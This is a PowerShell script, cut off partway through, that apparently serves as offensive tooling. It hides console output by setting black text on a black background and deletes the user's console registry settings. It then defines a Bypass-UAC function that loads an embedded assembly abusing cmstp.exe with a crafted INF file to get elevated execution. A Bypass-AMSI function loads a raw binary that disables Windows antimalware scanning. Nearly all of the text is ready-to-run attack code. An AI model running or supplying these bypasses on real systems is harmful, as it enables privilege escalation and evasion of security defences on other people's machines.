$Host.UI.RawUI.BackgroundColor = 'Black' ; $Host.UI.RawUI.ForegroundColor = 'Black' ; $Host.PrivateData.ErrorForegroundColor = 'Red' ; $Host.PrivateData.WarningForegroundColor = 'Magenta' ; $Host.PrivateData.DebugForegroundColor = 'Yellow' ; $Host.PrivateData.VerboseForegroundColor = 'Green' ; $Host.PrivateData.ProgressForegroundColor = 'White' ; $Host.PrivateData.ProgressBackgroundColor = 'Blue'

REG DELETE "HKCU\Console"/f 2>&1> $null
REG ADD "HKCU\Console\%SystemRoot%_System32_WindowsPowerShell_v1.0_powershell.exe" /t REG_SZ /v FaceName /d Consolas /f 2>&1> $null
REG ADD "HKCU\Console\%SystemRoot%_System32_WindowsPowerShell_v1.0_powershell.exe" /v FontFamily /t REG_DWORD /d 54 /f 2>&1> $null
REG ADD "HKCU\Console\%SystemRoot%_System32_WindowsPowerShell_v1.0_powershell.exe" /v FontWeight /t REG_DWORD /d 700 /f 2>&1> $null
REG ADD "HKCU\Console\%SystemRoot%_System32_WindowsPowerShell_v1.0_powershell.exe" /v FontSize /t REG_DWORD /d 1048576 /f 2>&1> $null
REG ADD "HKCU\Console\%SystemRoot%_System32_WindowsPowerShell_v1.0_powershell.exe" /v WindowSize /t REG_DWORD /d 1966180 /f 2>&1> $null
REG ADD "HKCU\Console\%SystemRoot%_SysWOW64_WindowsPowerShell_v1.0_powershell.exe" /t REG_SZ /v FaceName /d Consolas /f 2>&1> $null
REG ADD "HKCU\Console\%SystemRoot%_SysWOW64_WindowsPowerShell_v1.0_powershell.exe" /v FontFamily /t REG_DWORD /d 54 /f 2>&1> $null
REG ADD "HKCU\Console\%SystemRoot%_SysWOW64_WindowsPowerShell_v1.0_powershell.exe" /v FontWeight /t REG_DWORD /d 700 /f 2>&1> $null
REG ADD "HKCU\Console\%SystemRoot%_SysWOW64_WindowsPowerShell_v1.0_powershell.exe" /v FontSize /t REG_DWORD /d 1048576 /f 2>&1> $null
REG ADD "HKCU\Console\%SystemRoot%_SysWOW64_WindowsPowerShell_v1.0_powershell.exe" /v WindowSize /t REG_DWORD /d 1966180 /f 2>&1> $null

function Bypass-UAC {
Param(
[Parameter(Mandatory = $true, Position = 0)]
[string]$Command)
if(-not ([System.Management.Automation.PSTypeName]'CMSTPBypass').Type){
[Reflection.Assembly]::Load([Convert]::FromBase64String("TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAGbn2VsAAAAAAAAAAOAAAiELAQsAABAAAAAGAAAAAAAAzi4AAAAgAAAAQAAAAAAAEAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAACAAAAAAgAAAAAAAAMAQIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAHwuAABPAAAAAEAAAMgCAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAA1A4AAAAgAAAAEAAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAAMgCAAAAQAAAAAQAAAASAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAGAAAAACAAAAFgAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAACwLgAAAAAAAEgAAAACAAUAFCIAAGgMAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABMwBACJAAAAAQAAESgEAAAKF40GAAABEwQRBBZyAQAAcCgFAAAKnREEbwYAAAoWmgpyBQAAcAtzBwAACgwIB28IAAAKJghyJQAAcG8IAAAKJggGbwgAAAomCHIpAABwbwgAAAomfgEAAARzCQAACg0JcjMAAHACbwoAAAomCG8LAAAKCW8LAAAKKAwAAAoIbwsAAAoqAAAAEzADAKEAAAACAAARfgIAAAQoDQAACi0Mcl0AAHAoDgAAChYqcwcAAAoKBgIoAwAABm8IAAAKJnKfAABwBm8LAAAKKA8AAAooDgAACn4CAAAEcxAAAAoLB3LRAABwBm8LAAAKKA8AAApvEQAACgcWbxIAAAoHKBMAAAomEgL+FQ4AAAF+FAAACgxy2wAAcCgFAAAGDAh+FAAACigVAAAKLehy5wAAcCgWAAAKFyoAAAATMAIATwAAAAMAABECKBcAAAoKBo5pLQZ+FAAACioGFppvGAAAChIB/hUOAAABBhaabxkAAAoLB34UAAAKKBUAAAosBn4UAAAKKgcoAgAABiYHGygBAAAGJgcqVnL3AABwgAEAAARyiAUAcIACAAAEKh4CKBoAAAoqAAAAQlNKQgEAAQAAAAAADAAAAHY0LjAuMzAzMTkAAAAABQBsAAAAdAIAACN+AADgAgAA5AIAACNTdHJpbmdzAAAAAMQFAADEBQAAI1VTAIgLAAAQAAAAI0dVSUQAAACYCwAA0AAAACNCbG9iAAAAAAAAAAIAAAFXFQIUCQAAAAD6JTMAFgAAAQAAAA8AAAACAAAAAgAAAAcAAAAGAAAAGgAAAAIAAAADAAAAAQAAAAIAAAABAAAAAwAAAAAACgABAAAAAAAGADsANAAGAOgAyAAGAAgByAAGAFYBNwEGAH4BdAEGAJUBNAAGAJoBNAAGAKkBNAAGAMIBtgEGAOgBdAEGAAECNAAKAC0CGgIKAGACGgIGAG4CNAAOAJsChgIAAAAAAQAAAAAAAQABAAEAEAAfAAAABQABAAEAFgBCAAoAFgBpAAoAAAAAAIAAliBKAA0AAQAAAAAAgACWIFUAEwADAFAgAAAAAJYAdAAYAAQA6CAAAAAAlgB/AB0ABQCYIQAAAACWAIcAIgAGAAkiAAAAAIYYlwAnAAcA8yEAAAAAkRjdAqEABwAAAAEAnQAAAAIAogAAAAEAnQAAAAEAqwAAAAEAqwAAAAEAvAARAJcAKwAZAJcAJwAhAJcAMAApAIMBNQA5AKIBOQBBALABPgBJAJcAJwBJANABRQBJAJcAMABJANcBSwAJAN8BUgBRAO0BVgBRAPoBHQBZAAkCZwBBABMCbABhAJcAMABhAD4CMABhAEwCcgBpAGgCdwBxAHUCfgBxAHoCgQB5AKQCZwBpAK0CjwBpAMACJwBpAMgClgAJAJcAJwAuAAsApQAuABMArgBcAIcAmgBpAQABAwBKAAEAQAEFAFUAAQAEgAAAAAAAAAAAAAAAAAAAAAAmAQAABAAAAAAAAAAAAAAAAQArAAAAAAAEAAAAAAAAAAAAAAABADQAAAAAAAQAAAAAAAAAAAAAAAEAhgIAAAAAAAAAAAA8TW9kdWxlPgBDTVNUUC1VQUMtQnlwYXNzLmRsbABDTVNUUEJ5cGFzcwBtc2NvcmxpYgBTeXN0ZW0AT2JqZWN0AEluZkRhdGEAU2hvd1dpbmRvdwBTZXRGb3JlZ3JvdW5kV2luZG93AEJpbmFyeVBhdGgAU2V0SW5mRmlsZQBFeGVjdXRlAFNldFdpbmRvd0FjdGl2ZQAuY3RvcgBoV25kAG5DbWRTaG93AENvbW1hbmRUb0V4ZWN1dGUAUHJvY2Vzc05hbWUAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAENNU1RQLVVBQy1CeXBhc3MAU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzAERsbEltcG9ydEF0dHJpYnV0ZQB1c2VyMzIuZGxsAFN5c3RlbS5JTwBQYXRoAEdldFJhbmRvbUZpbGVOYW1lAENoYXIAQ29udmVydABUb0NoYXIAU3RyaW5nAFNwbGl0AFN5c3RlbS5UZXh0AFN0cmluZ0J1aWxkZXIAQXBwZW5kAFJlcGxhY2UAVG9TdHJpbmcARmlsZQBXcml0ZUFsbFRleHQARXhpc3RzAENvbnNvbGUAV3JpdGVMaW5lAENvbmNhdABTeXN0ZW0uRGlhZ25vc3RpY3MAUHJvY2Vzc1N0YXJ0SW5mbwBzZXRfQXJndW1lbnRzAHNldF9Vc2VTaGVsbEV4ZWN1dGUAUHJvY2VzcwBTdGFydABJbnRQdHIAWmVybwBvcF9FcXVhbGl0eQBTeXN0ZW0uV2luZG93cy5Gb3JtcwBTZW5kS2V5cwBTZW5kV2FpdABHZXRQcm9jZXNzZXNCeU5hbWUAUmVmcmVzaABnZXRfTWFpbldpbmRvd0hhbmRsZQAuY2N0b3IAAAMuAAAfQwA6AFwAdwBpAG4AZABvAHcAcwBcAHQAZQBtAHAAAANcAAAJLgBpAG4AZgAAKVIARQBQAEwAQQBDAEUAXwBDAE8ATQBNAEEATgBEAF8ATABJAE4ARQAAQUMAbwB1AGwAZAAgAG4AbwB0ACAAZgBpAG4AZAAgAGMAbQBzAHQAcAAuAGUAeABlACAAYgBpAG4AYQByAHkAIQAAMVAAYQB5AGwAbwBhAGQAIABmAGkAbABlACAAdwByAGkAdAB0AGUAbgAgAHQAbwAgAAAJLwBhAHUAIAAAC2MAbQBzAHQAcAAAD3sARQBOAFQARQBSAH0AAISPWwB2AGUAcgBzAGkAbwBuAF0ADQAKAFMAaQBnAG4AYQB0AHUAcgBlAD0AJABjAGgAaQBjAGEAZwBvACQADQAKAEEAZAB2AGEAbgBjAGUAZABJAE4ARgA9ADIALgA1AA0ACgANAAoAWwBEAGUAZgBhAHUAbAB0AEkAbgBzAHQAYQBsAGwAXQANAAoAQwB1AHMAdABvAG0ARABlAHMAdABpAG4AYQB0AGkAbwBuAD0AQwB1AHMAdABJAG4AcwB0AEQAZQBzAHQAUwBlAGMAdABpAG8AbgBBAGwAbABVAHMAZQByAHMADQAKAFIAdQBuAFAAcgBlAFMAZQB0AHUAcABDAG8AbQBtAGEAbgBkAHMAPQBSAHUAbgBQAHIAZQBTAGUAdAB1AHAAQwBvAG0AbQBhAG4AZABzAFMAZQBjAHQAaQBvAG4ADQAKAA0ACgBbAFIAdQBuAFAAcgBlAFMAZQB0AHUAcABDAG8AbQBtAGEAbgBkAHMAUwBlAGMAdABpAG8AbgBdAA0ACgA7ACAAQwBvAG0AbQBhAG4AZABzACAASABlAHIAZQAgAHcAaQBsAGwAIABiAGUAIAByAHUAbgAgAEIAZQBmAG8AcgBlACAAUwBlAHQAdQBwACAAQgBlAGcAaQBuAHMAIAB0AG8AIABpAG4AcwB0AGEAbABsAA0ACgBSAEUAUABMAEEAQwBFAF8AQwBPAE0ATQBBAE4ARABfAEwASQBOAEUADQAKAHQAYQBzAGsAawBpAGwAbAAgAC8ASQBNACAAYwBtAHMAdABwAC4AZQB4AGUAIAAvAEYADQAKAA0ACgBbAEMAdQBzAHQASQBuAHMAdABEAGUAcwB0AFMAZQBjAHQAaQBvAG4AQQBsAGwAVQBzAGUAcgBzAF0ADQAKADQAOQAwADAAMAAsADQAOQAwADAAMQA9AEEAbABsAFUAUwBlAHIAXwBMAEQASQBEAFMAZQBjAHQAaQBvAG4ALAAgADcADQAKAA0ACgBbAEEAbABsAFUAUwBlAHIAXwBMAEQASQBEAFMAZQBjAHQAaQBvAG4AXQANAAoAIgBIAEsATABNACIALAAgACIAUwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAQQBwAHAAIABQAGEAdABoAHMAXABDAE0ATQBHAFIAMwAyAC4ARQBYAEUAIgAsACAAIgBQAHIAbwBmAGkAbABlAEkAbgBzAHQAYQBsAGwAUABhAHQAaAAiACwAIAAiACUAVQBuAGUAeABwAGUAYwB0AGUAZABFAHIAcgBvAHIAJQAiACwAIAAiACIADQAKAA0ACgBbAFMAdAByAGkAbgBnAHMAXQANAAoAUwBlAHIAdgBpAGMAZQBOAGEAbQBlAD0AIgBDAG8AcgBwAFYAUABOACIADQAKAFMAaABvAHIAdABTAHYAYwBOAGEAbQBlAD0AIgBDAG8AcgBwAFYAUABOACIADQAKAA0ACgAAO2MAOgBcAHcAaQBuAGQAbwB3AHMAXABzAHkAcwB0AGUAbQAzADIAXABjAG0AcwB0AHAALgBlAHgAZQAACrDdag7FtE2aTMtg45Z5hgAIt3pcVhk04IkCBg4FAAICGAgEAAECGAQAAQ4OBAABAg4EAAEYDgMgAAEEIAEBCAQgAQEOAwAADgQAAQMOBiABHQ4dAwUgARIlDgYgAhIlDg4DIAAOBQACAQ4OCgcFDg4SJRIlHQMEAAEBDgUAAg4ODgQgAQECBgABEjUSMQIGGAUAAgIYGAcHAxIlEjEYBgABHRI1DgMgABgGBwIdEjUYAwAAAQgBAAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwEAAACkLgAAAAAAAAAAAAC+LgAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAsC4AAAAAAAAAAAAAAABfQ29yRGxsTWFpbgBtc2NvcmVlLmRsbAAAAAAA/yUAIAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABABAAAAAYAACAAAAAAAAAAAAAAAAAAAABAAEAAAAwAACAAAAAAAAAAAAAAAAAAAABAAAAAABIAAAAWEAAAGwCAAAAAAAAAAAAAGwCNAAAAFYAUwBfAFYARQBSAFMASQBPAE4AXwBJAE4ARgBPAAAAAAC9BO/+AAABAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAQAAAACAAAAAAAAAAAAAAAAAAAARAAAAAEAVgBhAHIARgBpAGwAZQBJAG4AZgBvAAAAAAAkAAQAAABUAHIAYQBuAHMAbABhAHQAaQBvAG4AAAAAAAAAsATMAQAAAQBTAHQAcgBpAG4AZwBGAGkAbABlAEkAbgBmAG8AAACoAQAAAQAwADAAMAAwADAANABiADAAAAAsAAIAAQBGAGkAbABlAEQAZQBzAGMAcgBpAHAAdABpAG8AbgAAAAAAIAAAADAACAABAEYAaQBsAGUAVgBlAHIAcwBpAG8AbgAAAAAAMAAuADAALgAwAC4AMAAAAEwAFQABAEkAbgB0AGUAcgBuAGEAbABOAGEAbQBlAAAAQwBNAFMAVABQAC0AVQBBAEMALQBCAHkAcABhAHMAcwAuAGQAbABsAAAAAAAoAAIAAQBMAGUAZwBhAGwAQwBvAHAAeQByAGkAZwBoAHQAAAAgAAAAVAAVAAEATwByAGkAZwBpAG4AYQBsAEYAaQBsAGUAbgBhAG0AZQAAAEMATQBTAFQAUAAtAFUAQQBDAC0AQgB5AHAAYQBzAHMALgBkAGwAbAAAAAAANAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAAMAAuADAALgAwAC4AMAAAADgACAABAEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4AAAAwAC4AMAAuADAALgAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAMAAAA0D4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")) | Out-Null }
[CMSTPBypass]::Execute($Command)}

function Bypass-AMSI {
if(-not ([System.Management.Automation.PSTypeName]"Bypass.AMSI").Type) {
[Reflection.Assembly]::Load([byte[]]@(77, 90, 144, 0, 3, 0, 0, 0, 4, 0, 0, 0, 255, 255, 0, 0, 184, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 128, 0, 0, 0, 14, 31, 186, 14, 0, 180, 9, 205, 33, 184, 1, 76, 205, 33, 84, 104, 105, 115, 32, 112, 114, 111, 103, 114, 97, 109, 32, 99, 97, 110, 110, 111, 116, 32, 98, 101, 32, 114, 117, 110, 32, 105, 110, 32, 68, 79, 83, 32, 109, 111, 100, 101, 46, 13, 13, 10, 36, 0, 0, 0, 0, 0, 0, 0, 80, 69, 0, 0, 76, 1, 3, 0, 162, 107, 61, 140, 0, 0, 0, 0, 0, 0, 0, 0, 224, 0, 34, 32, 11, 1, 48, 0, 0, 14, 0, 0, 0, 6, 0, 0, 0, 0, 0, 0, 198, 44, 0, 0, 0, 32, 0, 0, 0, 64, 0, 0, 0, 0, 0, 16, 0, 32, 0, 0, 0, 2, 0, 0, 4, 0, 0, 0, 0, 0, 0, 0, 6, 0, 0, 0, 0, 0, 0, 0, 0, 128, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 3, 0, 96, 133, 0, 0, 16, 0, 0, 16, 0, 0, 0, 0, 16, 0, 0, 16, 0, 0, 0, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 113, 44, 0, 0, 79, 0, 0, 0, 0, 64, 0, 0, 136, 3, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 96, 0, 0, 12, 0, 0, 0, 212, 43, 0, 0, 56, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 32, 0, 0, 8, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 8, 32, 0, 0, 72, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 46, 116, 101, 120, 116, 0, 0, 0, 212, 12, 0, 0, 0, 32, 0, 0, 0, 14, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 32, 0, 0, 96, 46, 114, 115, 114, 99, 0, 0, 0, 136, 3, 0, 0, 0, 64, 0, 0, 0, 4, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 64, 46, 114, 101, 108, 111, 99, 0, 0, 12, 0, 0, 0, 0, 96, 0, 0, 0, 2, 0, 0, 0, 20, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 66, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 165, 44, 0, 0, 0, 0, 0, 0, 72, 0, 0, 0, 2, 0, 5, 0, 16, 33, 0, 0, 196, 10, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 19, 48, 4, 0, 170, 0, 0, 0, 1, 0, 0, 17, 114, 1, 0, 0, 112, 40, 2, 0, 0, 6, 10, 6, 126, 16, 0, 0, 10, 40, 17, 0, 0, 10, 44, 12, 114, 19, 0, 0, 112, 40, 18, 0, 0, 10, 23, 42, 6, 114, 107, 0, 0, 112, 40, 1, 0, 0, 6, 11, 7, 126, 16, 0, 0, 10, 40, 17, 0, 0, 10, 44, 12, 114, 137, 0, 0, 112, 40, 18, 0, 0, 10, 23, 42, 27, 106, 40, 19, 0, 0, 10, 12, 22, 13, 7, 8, 31, 64, 18, 3, 40, 3, 0, 0, 6, 45, 12, 114, 253, 0, 0, 112, 40, 18, 0, 0, 10, 23, 42, 25, 141, 22, 0, 0, 1, 37, 208, 1, 0, 0, 4, 40, 20, 0, 0, 10, 25, 40, 21, 0, 0, 10, 19, 4, 22, 17, 4, 25, 40, 22, 0, 0, 10, 7, 31, 27, 40, 23, 0, 0, 10, 17, 4, 25, 40, 4, 0, 0, 6, 114, 115, 1, 0, 112, 40, 18, 0, 0, 10, 22, 42, 30, 2, 40, 24, 0, 0, 10, 42, 0, 0, 66, 83, 74, 66, 1, 0, 1, 0, 0, 0, 0, 0, 12, 0, 0, 0, 118, 52, 46, 48, 46, 51, 48, 51, 49, 57, 0, 0, 0, 0, 5, 0, 108, 0, 0, 0, 28, 3, 0, 0, 35, 126, 0, 0, 136, 3, 0, 0, 0, 4, 0, 0, 35, 83, 116, 114, 105, 110, 103, 115, 0, 0, 0, 0, 136, 7, 0, 0, 196, 1, 0, 0, 35, 85, 83, 0, 76, 9, 0, 0, 16, 0, 0, 0, 35, 71, 85, 73, 68, 0, 0, 0, 92, 9, 0, 0, 104, 1, 0, 0, 35, 66, 108, 111, 98, 0, 0, 0, 0, 0, 0, 0, 2, 0, 0, 1, 87, 149, 2, 52, 9, 2, 0, 0, 0, 250, 1, 51, 0, 22, 0, 0, 1, 0, 0, 0, 26, 0, 0, 0, 4, 0, 0, 0, 1, 0, 0, 0, 6, 0, 0, 0, 10, 0, 0, 0, 24, 0, 0, 0, 15, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 2, 0, 0, 0, 4, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 169, 2, 1, 0, 0, 0, 0, 0, 6, 0, 209, 1, 34, 3, 6, 0, 62, 2, 34, 3, 6, 0, 5, 1, 240, 2, 15, 0, 66, 3, 0, 0, 6, 0, 45, 1, 191, 2, 6, 0, 180, 1, 191, 2, 6, 0, 149, 1, 191, 2, 6, 0, 37, 2, 191, 2, 6, 0, 241, 1, 191, 2, 6, 0, 10, 2, 191, 2, 6, 0, 68, 1, 191, 2, 6, 0, 25, 1, 3, 3, 6, 0, 247, 0, 3, 3, 6, 0, 120, 1, 191, 2, 6, 0, 95, 1, 109, 2, 6, 0, 128, 3, 184, 2, 6, 0, 220, 0, 34, 3, 6, 0, 210, 0, 184, 2, 6, 0, 233, 2, 184, 2, 6, 0, 170, 0, 184, 2, 6, 0, 232, 2, 184, 2, 6, 0, 92, 2, 184, 2, 6, 0, 81, 3, 34, 3, 6, 0, 205, 3, 184, 2, 6, 0, 151, 0, 184, 2, 6, 0, 148, 2, 3, 3, 0, 0, 0, 0, 38, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 16, 0, 125, 0, 96, 3, 65, 0, 1, 0, 1, 0, 0, 1, 0, 0, 47, 0, 0, 0, 65, 0, 1, 0, 7, 0, 19, 1, 0, 0, 10, 0, 0, 0, 73, 0, 2, 0, 7, 0, 51, 1, 78, 0, 90, 0, 0, 0, 0, 0, 128, 0, 150, 32, 103, 3, 94, 0, 1, 0, 0, 0, 0, 0, 128, 0, 150, 32, 216, 3, 100, 0, 3, 0, 0, 0, 0, 0, 128, 0, 150, 32, 150, 3, 105, 0, 4, 0, 0, 0, 0, 0, 128, 0, 145, 32, 231, 3, 114, 0, 8, 0, 80, 32, 0, 0, 0, 0, 150, 0, 143, 0, 121, 0, 11, 0, 6, 33, 0, 0, 0, 0, 134, 24, 226, 2, 6, 0, 11, 0, 0, 0, 1, 0, 178, 0, 0, 0, 2, 0, 186, 0, 0, 0, 1, 0, 195, 0, 0, 0, 1, 0, 118, 3, 0, 0, 2, 0, 97, 2, 0, 0, 3, 0, 165, 3, 2, 0, 4, 0, 135, 3, 0, 0, 1, 0, 190, 3, 0, 0, 2, 0, 139, 0, 0, 0, 3, 0, 104, 2, 9, 0, 226, 2, 1, 0, 17, 0, 226, 2, 6, 0, 25, 0, 226, 2, 10, 0, 41, 0, 226, 2, 16, 0, 49, 0, 226, 2, 16, 0, 57, 0, 226, 2, 16, 0, 65, 0, 226, 2, 16, 0, 73, 0, 226, 2, 16, 0, 81, 0, 226, 2, 16, 0, 89, 0, 226, 2, 16, 0, 97, 0, 226, 2, 21, 0, 105, 0, 226, 2, 16, 0, 113, 0, 226, 2, 16, 0, 121, 0, 226, 2, 16, 0, 137, 0, 226, 2, 6, 0, 153, 0, 221, 2, 34, 0, 153, 0, 242, 3, 37, 0, 161, 0, 200, 0, 43, 0, 169, 0, 178, 3, 48, 0, 185, 0, 195, 3, 53, 0, 209, 0, 135, 2, 61, 0, 209, 0, 211, 3, 66, 0, 153, 0, 209, 2, 75, 0, 129, 0, 226, 2, 6, 0, 46, 0, 11, 0, 125, 0, 46, 0, 19, 0, 134, 0, 46, 0, 27, 0, 165, 0, 46, 0, 35, 0, 174, 0, 46, 0, 43, 0, 190, 0, 46, 0, 51, 0, 190, 0, 46, 0, 59, 0, 190, 0, 46, 0, 67, 0, 174, 0, 46, 0, 75, 0, 196, 0, 46, 0, 83, 0, 190, 0, 46, 0, 91, 0, 190, 0, 46, 0, 99, 0, 220, 0, 46, 0, 107, 0, 6, 1, 46, 0, 115, 0, 19, 1, 99, 0, 123, 0, 97, 1, 1, 0, 3, 0, 0, 0, 4, 0, 26, 0, 1, 0, 156, 2, 0, 1, 3, 0, 103, 3, 1, 0, 0, 1, 5, 0, 216, 3, 1, 0, 0, 1, 7, 0, 150, 3, 1, 0, 0, 1, 9, 0, 228, 3, 2, 0, 204, 44, 0, 0, 1, 0, 4, 128, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 119, 0, 0, 0, 4, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 81, 0, 130, 0, 0, 0, 0, 0, 4, 0, 3, 0, 0, 0, 0, 0, 0, 107, 101, 114, 110, 101, 108, 51, 50, 0, 95, 95, 83, 116, 97, 116, 105, 99, 65, 114, 114, 97, 121, 73, 110, 105, 116, 84, 121, 112, 101, 83, 105, 122, 101, 61, 51, 0, 60, 77, 111, 100, 117, 108, 101, 62, 0, 60, 80, 114, 105, 118, 97, 116, 101, 73, 109, 112, 108, 101, 109, 101, 110, 116, 97, 116, 105, 111, 110, 68, 101, 116, 97, 105, 108, 115, 62, 0, 53, 49, 67, 65, 70, 66, 52, 56, 49, 51, 57, 66, 48, 50, 69, 48, 54, 49, 68, 52, 57, 49, 57, 67, 53, 49, 55, 54, 54, 50, 49, 66, 70, 56, 55, 68, 65, 67, 69, 68, 0, 66, 121, 112, 97, 115, 115, 65, 77, 83, 73, 0, 109, 115, 99, 111, 114, 108, 105, 98, 0, 115, 114, 99, 0, 68, 105, 115, 97, 98, 108, 101, 0, 82, 117, 110, 116, 105, 109, 101, 70, 105, 101, 108, 100, 72, 97, 110, 100, 108, 101, 0, 67, 111, 110, 115, 111, 108, 101, 0, 104, 77, 111, 100, 117, 108, 101, 0, 112, 114, 111, 99, 78, 97, 109, 101, 0, 110, 97, 109, 101, 0, 87, 114, 105, 116, 101, 76, 105, 110, 101, 0, 86, 97, 108, 117, 101, 84, 121, 112, 101, 0, 67, 111, 109, 112, 105, 108, 101, 114, 71, 101, 110, 101, 114, 97, 116, 101, 100, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 71, 117, 105, 100, 65, 116, 116, 114, 105, 98, 